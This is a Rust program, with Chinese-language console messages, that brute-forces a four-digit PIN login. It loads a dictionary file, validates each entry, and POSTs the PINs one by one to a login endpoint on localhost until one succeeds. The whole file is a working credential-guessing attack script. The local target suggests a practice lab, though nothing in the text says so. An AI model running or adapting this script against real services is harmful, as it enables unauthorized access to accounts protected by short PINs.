use reqwest::blocking::Client;
use std::fs;
use std::io::{self, BufRead};

const TARGET_URL: &str = "http://127.0.0.1:3000/login";
const DICT_PATH: &str = "pin_dict.txt";

fn main() {
    let client = Client::new();
    let pins = load_dict(DICT_PATH);

    println!("字典加载完成，共 {} 个密码，开始爆破...", pins.len());

    for (i, pin) in pins.iter().enumerate() {
        print!("[{}] 正在尝试: {} ... ", i + 1, pin);

        match try_login(&client, pin) {
            Ok(true) => {
                println!(">>> 门开了！正确的 PIN 码是: {} <<<", pin);
                break;
            }
            Ok(false) => println!("错。继续。"),
            Err(e) => println!("网络炸了: {}，跳过这个继续下一个。", e),
        }
    }
}

fn load_dict(path: &str) -> Vec<String> {
    let file = match fs::File::open(path) {
        Ok(f) => f,
        Err(_) => {
            eprintln!("字典呢？！文件 '{}' 打不开！", path);
            std::process::exit(1);
        }
    };

    let reader = io::BufReader::new(file);

    let mut pins = Vec::new();
    let mut total_lines = 0;
    let mut empty_lines = 0;
    let mut bad_lines = 0;
    let mut bad_examples: Vec<String> = Vec::new();

    for line in reader.lines() {
        total_lines += 1;

        let line = match line {
            Ok(l) => l,
            Err(e) => {
                eprintln!("警告：第 {} 行读不了，跳过。原因: {}", total_lines, e);
                continue;
            }
        };

        let pin = line.trim().to_string();

        if pin.is_empty() {
            empty_lines += 1;
            continue;
        }

        if pin.len() != 4 {
            bad_lines += 1;
            if bad_examples.len() < 5 {
                bad_examples.push(format!("'{}' ({}位)", pin, pin.len()));
            }
            continue;
        }

        if !pin.chars().all(|c| c.is_digit(10)) {
            bad_lines += 1;
            if bad_examples.len() < 5 {
                let non_digit: String = pin.chars().filter(|c| !c.is_digit(10)).collect();
                bad_examples.push(format!("'{}' (含非数字字符: '{}')", pin, non_digit));
            }
            continue;
        }

        pins.push(pin);
    }

    if pins.is_empty() {
        eprintln!("错误：文件 '{}' 里一个有效 PIN 码都没有！", path);
        eprintln!("请检查文件内容——每行一个 4 位数字密码。");
        std::process::exit(1);
    }

    eprintln!("--- 字典加载报告 ---");
    eprintln!(
        "文件: {} | 总行: {} | 有效: {} | 空行: {} | 无效: {}",
        path, total_lines, pins.len(), empty_lines, bad_lines
    );
    if bad_lines > 0 {
        for example in &bad_examples {
            eprintln!("  例: {}", example);
        }
    }
    eprintln!("---");

    pins
}

fn try_login(client: &Client, pin: &str) -> Result<bool, reqwest::Error> {
    let response = client
        .post(TARGET_URL)
        .header("Content-Type", "application/json")
        .body(serde_json::json!({"pin": pin}).to_string())
        .send()?;

    Ok(response.status().is_success())
}